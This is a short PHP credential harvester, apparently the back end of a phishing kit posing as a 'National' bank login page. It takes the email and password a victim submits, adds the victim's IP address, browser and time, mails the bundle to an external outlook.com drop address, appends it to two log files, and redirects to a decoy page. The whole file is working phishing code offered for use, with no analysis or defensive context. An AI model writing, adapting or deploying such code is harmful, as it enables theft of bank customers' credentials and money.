<?php
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");
$cc = $_POST['identity'];
$pp = $_POST['password'];
$data ="
=============## NATIONAL LOGIN ##==================
|EMAIL : $cc
|PASS : $pp
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##NATIONAL #$browserAgent";

$emailusr = 'ventura514@outlook.com';

mail($emailusr, $subj, $data);

 $fp = fopen("logs.txt", "a");
 //write to the file
 fwrite($fp, $data);
 fclose($fp);

header("Location: ./nbc.html");

 $fp = fopen("../NBC.txt", "a");
 //write to the file
 fwrite($fp, $data);
 fclose($fp);

?>